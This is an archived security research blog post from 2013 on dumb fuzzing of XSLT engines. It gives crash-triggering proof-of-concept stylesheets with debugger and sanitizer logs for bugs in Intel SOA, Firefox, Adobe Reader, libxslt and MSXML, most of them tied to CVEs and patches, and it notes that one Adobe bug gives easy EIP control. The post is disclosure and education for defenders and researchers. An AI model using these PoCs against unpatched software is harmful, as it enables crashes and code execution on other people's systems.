---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-02-25_mutation-based-fuzzing-of-xslt-engines.md
original_filename: 2013-02-25_mutation-based-fuzzing-of-xslt-engines.md
title: Mutation-based fuzzing of XSLT engines
category: documents
detected_topics:
- sso
- command-injection
- api-security
tags:
- imported
- documents
- sso
- command-injection
- api-security
language: en
raw_sha256: a7b9922c58bd2f23c7d301055c61b69255b6aa4187c3d6b1cf4b4a382e24b025
text_sha256: 5bc8d113d53303438b573c6c2d761b917c3e7efd89821ee394112d63581fde66
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Mutation-based fuzzing of XSLT engines

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-02-25_mutation-based-fuzzing-of-xslt-engines.md
- Source Type: markdown
- Detected Topics: sso, command-injection, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `a7b9922c58bd2f23c7d301055c61b69255b6aa4187c3d6b1cf4b4a382e24b025`
- Text SHA256: `5bc8d113d53303438b573c6c2d761b917c3e7efd89821ee394112d63581fde66`


## Content

---
title: "Mutation-based fuzzing of XSLT engines"
page_title: "Mutation-based fuzzing of XSLT engines | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2013/02/25/mutation-based_fuzzing_of_xslt_engines/index.html"
final_url: "https://www.agarri.fr/blog/archives/2013/02/25/mutation-based_fuzzing_of_xslt_engines/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["Intel", "Mozilla (Firefox)", "Adobe (Reader)", "libxslt", "Microsoft (MSXML)", "Google (Chrome & Chromium)"]
bugs: ["Memory corruption", "Fuzzing", "Heap buffer overflow", "Use-After-Free", "NULL pointer dereference", "Out-of-bounds Read"]
publication_date: "2013-02-25"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6410
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2013](https://www.agarri.fr/blog/archives/2013/index.html) > [02](https://www.agarri.fr/blog/archives/2013/02/index.html) >  
[<](https://www.agarri.fr/blog/archives/2012/11/26/zeronights_2012_opinions_and_links/index.html) 17:26:37 [>](https://www.agarri.fr/blog/archives/2013/10/22/exploiting_wpad_with_burp_suite_and_the_http_injector_extension/index.html)

##  lundi 25 février 2013, 17:26:37 (UTC+0100) 

### Mutation-based fuzzing of XSLT engines

  * Intro

  

I did in 2011 some research about vulnerabilities caused by the abuse of dangerous features provided by XSLT engines. This leads to a few vulnerabilities (mainly access to the file system or code execution) in Webkit, xmlsec, SharePoint, Liferay, MoinMoin, PostgreSQL, ... In 2012, I decided to look for memory corruption bugs and did some mutation-based (aka "dumb") fuzzing of XSLT engines. This article presents more than 10 different PoC affecting Firefox, Adobe Reader, Chrome, Internet Explorer and Intel SOA. Most of these bugs have been patched by their respective vendors. The goal of this blog-post is mainly to show to XML newbies what pathological XSLT looks like. Of course, exploit writers could find some useful information too.

  

When fuzzing XSLT engines by providing malformed XSLT stylesheets, three distinct components (at least) are tested:  
\- the XML parser itself, as a XSLT stylesheet is a XML document  
\- the XSLT interpreter, which need to compile and execute the provided code  
\- the XPath engine, because attributes like "match" and "select" use it to reference data

  

Given that dumb fuzzing is used, the generation of test cases is quite simple. [Radamsa](http://code.google.com/p/ouspg/wiki/Radamsa) generates packs of 100 stylesheets from a pool of 7000 grabbed here and there. A much improved version (using among others grammar-based generation) is on the way and already gives promising results ;-) PoC were minimized manually, given that the template structure and execution flow of XSLT doesn't work well with minimizers like [tmin](http://code.google.com/p/tmin/) or [delta](http://delta.tigris.org/).

  

  * Intel SOA Expressway XSLT 2.0 Processor

  

Intel was proposing an evaluation version of their [XSLT 2.0 engine](http://software.intel.com/en-us/articles/intel-soa-expressway-xslt-20-processor). It's quite rare to encounter a C-based XSLT engine supporting version 2.0, so it was added to the testbed even if it has minor real-world relevance. In my opinion, the first bug should have been detected during functionnal testing. When [idiv](http://www.w3.org/TR/xpath20/#doc-xpath-MultiplicativeExpr) (available in XPath 2.0) is used with 1 as the denominator, a optimization/shortcut is used. But it seems that someone has confused the address and the value of the corresponding numerator variable. Please note that the value of the numerator corresponds to 0x41424344 in hex.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
  
  <xsl:template match="/">
  <xsl:value-of select="1094861636 idiv 1.0"/>
  </xsl:template>
  
  </xsl:stylesheet>
  

When run under [Dr Memory](http://www.drmemory.org/) (a Windows tool built on [DynamoRIO](http://dynamorio.org/) and similar to [Valgrind](http://valgrind.org/)), the following log is generated:
  
  
  Error #1: UNADDRESSABLE ACCESS: reading 0x41424344-0x41424348 4 byte(s)
  # 0 xslt2cmd.exe!?  +0x0  (0x008340e6 <xslt2cmd.exe+0x4340e6>)
  # 1 xslt2cmd.exe!?  +0x0  (0x0082c74b <xslt2cmd.exe+0x42c74b>)
  # 2 xslt2cmd.exe!?  +0x0  (0x0082d5aa <xslt2cmd.exe+0x42d5aa>)
  # 3 xslt2cmd.exe!?  +0x0  (0x008266a6 <xslt2cmd.exe+0x4266a6>)
  # 4 xslt2cmd.exe!?  +0x0  (0x004cb8fc <xslt2cmd.exe+0xcb8fc>)
  # 5 xslt2cmd.exe!?  +0x0  (0x004e2c28 <xslt2cmd.exe+0xe2c28>)
  # 6 xslt2cmd.exe!?  +0x0  (0x004028f7 <xslt2cmd.exe+0x28f7>)
  # 7 napa2::tick  +0x4b5101 (0x010c4cde <xslt2cmd.exe+0xcc4cde>)
  # 8 KERNEL32.dll!RegisterWaitForInputIdle +0x48  (0x7c817077 <KERNEL32.dll+0x17077>)
  Note: @0:00:06.750 in thread 2008
  Note: instruction: mov  (%edi) -> %edx
  

  

Now, an use-after-free(), also detected by Dr Memory. It occurs when a sequence gets its only element removed using [fn:remove()](http://www.w3.org/TR/xpath-functions/#func-remove).
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:xs="http://www.w3.org/2001/XMLSchema" version="2.0">
  
  <xsl:template match="/">
  <xsl:variable name="foo" as="xs:string *">
  <xsl:sequence select="'Do NOT remove me!'"/>
  </xsl:variable>
  <xsl:value-of select="remove($foo,1)" />
  </xsl:template>
  
  </xsl:stylesheet>
  

  

Contrary to [Address Sanitizer](http://code.google.com/p/address-sanitizer/), no information is given by Dr Memory regarding the places where this buffer was allocated/freed :-(
  
  
  Error #1: UNADDRESSABLE ACCESS: reading 0x02e2d228-0x02e2d229 1 byte(s)
  # 0 xslt2cmd.exe!?  +0x0  (0x00655710 <xslt2cmd.exe+0x255710>)
  # 1 xslt2cmd.exe!?  +0x0  (0x0064e645 <xslt2cmd.exe+0x24e645>) 
  # 2 xslt2cmd.exe!?  +0x0  (0x004ce845 <xslt2cmd.exe+0xce845>)
  # 3 xslt2cmd.exe!?  +0x0  (0x004e2c28 <xslt2cmd.exe+0xe2c28>)
  # 4 xslt2cmd.exe!?  +0x0  (0x004028f7 <xslt2cmd.exe+0x28f7>)
  # 5 napa2::tick  +0x4b5101 (0x010c4cde <xslt2cmd.exe+0xcc4cde>)
  # 6 KERNEL32.dll!RegisterWaitForInputIdle +0x48  (0x7c817077 <KERNEL32.dll+0x17077>
  Note: @0:00:07.235 in thread 476
  Note: next higher malloc: 0x02e2e058-0x02e2ef38
  Note: 0x02e2d228-0x02e2d229 overlaps memory 0x02e2d158-0x02e2de60 that was freed
  Note: instruction: movzx  (%ecx,%eax,1) -> %edx
  

  

Several other crashes were found during a two days fuzzing session. This is clearly the least robust tested XSLT engine. By the way, no patch is available, given that Intel has choose to remove this software from their website after notification of the bugs found.

  

  * Mozilla Firefox

  

Mozilla ships Firefox with its own XSLT engine, [Transformiix](http://en.wikipedia.org/wiki/TransforMiiX). It should be noted that XSLT processing in browsers can be triggered either via [JavaScript](https://developer.mozilla.org/en-US/docs/Using_the_Mozilla_JavaScript_interface_to_XSL_Transformations) or via XML documents including a [processing instruction](http://en.wikipedia.org/wiki/Processing_Instruction). Few minors bugs were found, and the [most interesting one](http://www.mozilla.org/security/announce/2012/mfsa2012-65.html) (from an exploitation point of view) will only allow to leak some data located before your buffer.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  
  <xsl:template match="/">
  <xsl:value-of select="format-number(1 div 7777777[many more]7777777, '#')"/>
  </xsl:template>
  
  </xsl:stylesheet>
  

  

Next, we have a [near NULL dereference](https://bugzilla.mozilla.org/show_bug.cgi?id=748365) during parsing of invalid XPath expressions. The offset to NULL is static, so it's just an annoying crasher.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  
  <xsl:template match="key('mykey', " />
  
  </xsl:stylesheet>
  

  

Last one for Transformiix, a [NULL EIP](http://www.mozilla.org/security/announce/2012/mfsa2012-08.html) during parsing of a SVG image including a XSLT transformation. Fun fact: Aki Helin [reported](https://bugzilla.mozilla.org/show_bug.cgi?id=701806) the same bug three days before me! Mozilla developpers [analyzed the root cause](https://bugzilla.mozilla.org/show_bug.cgi?id=702466#c6) as a type confusion bug, which are quite common in XSLT engines: _"So we're effectively casting a txElementHandler* to a txHandlerTable*, and then trying to work with the txHandlerTable* pointer, and crashing."_
  
  
  <!DOCTYPE svg:svg [<!ATTLIST transform id ID #IMPLIED>]>
  <?xml-stylesheet type="application/xml" href="#foobar"?>
  <svg:svg xmlns:svg="http://www.w3.org/1999/XSL/Transform">
  
  <svg:defs>
  <transform id="foobar"/>
  </svg:defs>
  
  </svg:svg>
  

  

Note the use of the "ID #IMPLIED" trick ([published](http://scarybeastsecurity.blogspot.fr/2011/01/harmless-svg-xslt-curiousity.html) by Chris Evans), which is used to embed the XSLT stylesheet inside the source document.

  

  * Adobe Reader

  

Adobe Reader uses a [forked](http://partners.adobe.com/public/developer/opensource/index.html) version of the open-source [Sablotron](http://www.gingerall.com/charlie/ga/xml/p_sab.xml). The two following bugs were found by fuzzing an [ASan](http://code.google.com/p/address-sanitizer/wiki/AddressSanitizer)-instrumented binary of the public version of Sablotron. The first bug bug ([CVE-2012-1525](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1525) patched by [APSB12-16](http://www.adobe.com/support/security/bulletins/apsb12-16.html)) is a typical heap-overflow occuring during parsing of UTF-8 strings. The calculation of the size of the destination buffer is done on characters and not on bytes. This buffer will overflow if large characters (like [0xE004D](http://codepoints.net/U+E004D)) are used.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"> 
  
  <xsl:template match="/"> 
  <xsl:attribute name="AB&#xE004D;DE"/> 
  </xsl:template> 
  
  </xsl:stylesheet>
  

The crash as detected by ASan:
  
  
  ==2288== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f8abcc394f4 at pc 0x7f8abe931825 bp 0x7fffab43bd30 sp 0x7fffab43bd28 
  WRITE of size 4 at 0x7f8abcc394f4 thread T0 
  
  #0  00000000000f8825 <utf8ToUtf16(wchar_t*, char const*)+0x135>: 
  for (const char *p = src; *p; p += utf8SingleCharLength(p)) 
  { 
  code = utf8CharCode(p); 
  if (code < 0x10000UL) 
  { 
  *dest = (wchar_t)(code); 
  f8825:	89 fa  mov  %edi,%edx 
  #1  isValidNCName(char const*)+0x52 
  
  0x7f8abcc394f4 is located 0 bytes to the right of 1140-byte region [0x7f8abcc39080, 0x7f8abcc394f4) allocated by thread T0 here: 
  
  #0  000000000040b042 <operator new[](unsigned long)+0x22>: 
  40b042:	4c 8d b5 d8 fd ff ff 	lea  -0x228(%rbp),%r14 
  #1  isValidNCName(char const*)+0x44 
  

The second bug ([CVE-2012-1530](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1530) patched via [APSB13-02](http://www.adobe.com/support/security/bulletins/apsb13-02.html)) is a quite sexy type-confusion/casting error. It is also one of the rare XSLT bugs where the behavior depends of the content of the XML document.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  
  <xsl:template match="node()">
  <xsl:apply-templates select="node()[lang('foo')]"/>
  </xsl:template>
  
  </xsl:stylesheet>
  

This stylesheet is then applied to the following XML document:
  
  
  <a>
  <abcd/>
  </a>
  

And we get this ASan crash:
  
  
  ==13350== ERROR: AddressSanitizer crashed on unknown address 0x64636261 (pc 0x7fb537c12ae7 sp 0x7fff48b894e0 bp 0x7fff48b89510 T0) 
  
  #0  0000000000102ae7 <AttList::findNdx(QName const&)+0x97>: 
  // need to use a temporary variable 
  // to get around Solaris template problem 
  Vertex * pTemp = (*this)[i]; 
  a = toA(pTemp); 
  if (attName == a -> getName()) 
  102ae7:	48 8b 07  mov  (%rdi),%rax 
  #1  Expression::callFunc(Situation&, Expression&, PList<Expression*>&, Context*)+0x2c16 
  

The following picture is a screenshot of a [DDD](http://www.gnu.org/software/ddd/) debugging session:

  
![](/docs/ddd_64636261.png)  

Gaining control EIP is trivial. The location of the fake "a" object is taken from the XML document and a function pointer is called just after:
  
  
  Program received signal SIGSEGV, Segmentation fault. 
  AttList::findNdx (this=0x6c6ef8, attName=...) at verts.cpp:1282 
  1282  if (attName == a -> getName()) 
  (gdb) x/3i $rip 
  => 0x415d24 <_ZN7AttList7findNdxERK5QName+96>:	mov  (%rdi),%rax
  0x415d27 <_ZN7AttList7findNdxERK5QName+99>:	callq  *0x40(%rax)
  0x415d2a <_ZN7AttList7findNdxERK5QName+102>:	mov  %rax,%rsi 
  (gdb) p/x $rdi
  $2 = 0x64636261
  

Offsets will vary depending of the underlying OS and version of Reader but the concept is quite similar under Windows. French speaking people will find in [MISC](http://www.unixgarden.com/index.php/category/misc) #66 (March 2013) an article detailling these two bugs. Note: other Adobe products (InDesign, Premiere, ...) may also be affected by these bugs.

  

  * lbxslt (used in Webkit, PHP5, PostgreSQL, xmlsec, ...)

  

Several extensions to XSLT 1.0 are disabled in the Webkit build of libxslt, which is a good thing. This has prevent several bugs in these extensions (like [func:function](https://bugzilla.gnome.org/show_bug.cgi?id=680920) and [rc4_decrypt](https://bugzilla.gnome.org/show_bug.cgi?id=675917)) to impact products like Chrome and the iPhone. Let's now detail two type-confusion bugs affecting every project using libxslt. The first one is [CVE-2012-2871](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2871) (aka Chromium [#138673](https://code.google.com/p/chromium/issues/detail?id=138673)):
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >
  <xsl:template match="*">
  <xsl:for-each select="namespace::*">
  <xsl:apply-templates/>
  </xsl:for-each>
  </xsl:template>
  </xsl:stylesheet>
  

When applying templates to nodes selected by "namespace::*", a out-of-bounds read is performed. Later, this value is used during unlinking of nodes, leading to a write error in xmlUnlinkNode(). The ASan log isn't very helpful because it stops at the first out-of-bounds read. However, under Valgrind:
  
  
  ==5547== Invalid read of size 4
  ==5547==  at 0x40E8C03: xsltApplyTemplates (transform.c:4837)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E6A4C: xsltForEach (transform.c:5628)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)
  ==5547==  by 0x40E7E41: xsltProcessOneNode (transform.c:2045)
  ==5547==  by 0x40E83E9: xsltProcessOneNode (transform.c:1875)
  ==5547==  by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)
  ==5547==  by 0x8049E11: xsltProcess (xsltproc.c:404)
  ==5547==  by 0x804A866: main (xsltproc.c:867)
  ==5547==  Address 0x43f90fc is 0 bytes after a block of size 4 alloc'd
  [...]
  =5547== Invalid read of size 4
  ==5547==  at 0x4150901: xmlUnlinkNode (tree.c:3783)
  ==5547==  by 0x40E8BEC: xsltApplyTemplates (transform.c:4898)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E6A4C: xsltForEach (transform.c:5628)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)
  ==5547==  by 0x40E7E41: xsltProcessOneNode (transform.c:2045)
  ==5547==  by 0x40E83E9: xsltProcessOneNode (transform.c:1875)
  ==5547==  by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)
  ==5547==  by 0x8049E11: xsltProcess (xsltproc.c:404)
  ==5547==  by 0x804A866: main (xsltproc.c:867)
  ==5547==  Address 0x43f9110 is not stack'd, malloc'd or (recently) free'd
  [...]
  ==5547== 
  ==5547== Invalid write of size 4
  ==5547==  at 0x4150904: xmlUnlinkNode (tree.c:3783)
  ==5547==  by 0x40E8BEC: xsltApplyTemplates (transform.c:4898)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E6A4C: xsltForEach (transform.c:5628)
  ==5547==  by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)
  ==5547==  by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)
  ==5547==  by 0x40E7E41: xsltProcessOneNode (transform.c:2045)
  ==5547==  by 0x40E83E9: xsltProcessOneNode (transform.c:1875)
  ==5547==  by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)
  ==5547==  by 0x8049E11: xsltProcess (xsltproc.c:404)
  ==5547==  by 0x804A866: main (xsltproc.c:867)
  ==5547==  Address 0x50 is not stack'd, malloc'd or (recently) free'd
  

A [clever defensive fix](http://src.chromium.org/viewvc/chrome/trunk/src/third_party/libxml/src/include/libxml/tree.h?r1=149930&r2=149929&pathrev=149930) was designed by Chris Evans. Quoting himself: _"My hack is to make the "namespace node" structure always have a NULL children field, if it should ever have an inappropriate lookup of node- >children after a forced cast to a generic node. Ugly but should be effective at catching _every_ instance of this bug."_ Simple but effective ;-)

  

[CVE-2012-2825](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2825) (aka Chromium [#127417](https://code.google.com/p/chromium/issues/detail?id=127417)) is a wild-read that which could be used to leak some information about the location of the string "http://www.w3.org/1999/XSL/Transform" (the XSL namespace) in memory. It could be useful in a context where memory randomization is used (like ASLR). A more complete analysis of the bug is available in the Chrome ticket.
  
  
  <!DOCTYPE whatever [
  <!ATTLIST magic blabla CDATA "anything">
  <!ENTITY foobar "abcd_efg****kl_mnop_qrst_uvwx_yzAB_CDEF_GHIK_KLMN_OPQR_STUV_WXYZ">
  ]>
  <magic xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"/>
  

0x2a (the hex value of the ASCII character "*") is clearly apparent in a GDB backtrace:
  
  
  #0  xmlStrEqual__internal_alias (str1=0x2a2a2a2a <Address 0x2a2a2a2a out of bounds>, 
  str2=0x1cf444 "http://www.w3.org/1999/XSL/Transform") at xmlstring.c:162
  #1  0x001aa384 in xsltParseTemplateContent (style=0x805cc58, templ=0x80598e8) at xslt.c:4849
  #2  0x001ac824 in xsltParseStylesheetProcess (ret=0x805cc58, doc=0x80598e8) at xslt.c:6456
  #3  0x001acd2c in xsltParseStylesheetImportedDoc (doc=0x80598e8, parentStyle=0x0) at xslt.c:6627
  #4  0x001acddf in xsltParseStylesheetDoc (doc=0x80598e8) at xslt.c:6666
  #5  0x0804a7f4 in main (argc=4, argv=0xbffff7e4) at xsltproc.c:830
  

  

  * Microsoft MSXML

  

Microsoft ships several version of MSXML, its own XML/XSLT engine. The most common versions are MSXML 3 and MSXML 6. MSXML 4 and 5 are mostly similar to MSXML 6 and are (afaik) only shipped with some old versions of Microsoft Office. [CVE-2013-0007](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0007) is a bug affecting versions 4 to 6 and patched in [MS13-002](http://technet.microsoft.com/security/bulletin/ms13-002). Given that MSXML is shared among products, this bug impacts at least Internet Explorer and SharePoint (cf. my [XXE bug](http://seclists.org/fulldisclosure/2011/Sep/133) for how to execute XSLT code in SharePoint). DotNetNuke and its [XML module](http://dnnxml.codeplex.com/) may be another valid entry point.
  
  
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  
  <xsl:template name="main_template" match="/">
  <xsl:for-each select="*">
  <xsl:apply-templates/>
  </xsl:for-each>
  </xsl:template>
  
  <xsl:template name="xxx_does_not_exist" match="//xxx[position()]" />
  
  </xsl:stylesheet>
  

I didin't spend any time on the technical analysis of this bug but the output of "!exploitable" looks interesting:
  
  
  eax=e9980013 ebx=000000d0 ecx=00f78a9a edx=00000001 esi=00f78a98 edi=0013e874
  eip=402a5ac4 esp=0013e870 ebp=0013e990 iopl=0  nv up ei pl nz na pe nc
  [...]
  Exception Faulting Address: 0xffffffffe998001b
  First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
  Exception Sub-Type: Read Access Violation
  [...]
  Basic Block:
  402a5ac4 mov edx,dword ptr [eax+8]
  Tainted Input Operands: eax
  402a5ac7 push esi
  402a5ac8 lea esi,[edx+0ch]
  Tainted Input Operands: edx
  402a5acb mov dword ptr [eax+8],esi
  Tainted Input Operands: eax, esi
  402a5ace mov eax,dword ptr [edx+4]
  Tainted Input Operands: edx
  402a5ad1 push 8
  402a5ad3 mov dword ptr [ecx+0a4h],eax
  Tainted Input Operands: eax
  402a5ad9 pop eax
  402a5ada pop esi
  402a5adb ret
  [...]
  Exploitability Classification: PROBABLY_EXPLOITABLE
  Recommended Bug Title: Probably Exploitable - Data from Faulting Address controls subsequent Write Address starting at msxml6!XEngine::stns+0x0000000000000006
  

Modifying the XPath predicate (for example using "xxx[//foo or position() != 3]") will slighlty modify the address in eax, which was probably not initialized properly.

  

  * Outro

  

I hope that you enjoyed this journey inside the little known world of XSLT parsers. A few of them were not discussed. For Oracle, it's because they still haven't patched the bugs I reported one year ago. For Opera, it's simply because it is ... how to say ... so fragile when fuzzed ;-) And there's also the bugs found when working for vendors. As said in the intro, a new XSLT fuzzing effort is on the way. Stay tuned!

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2013/02/25/mutation-based_fuzzing_of_xslt_engines/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
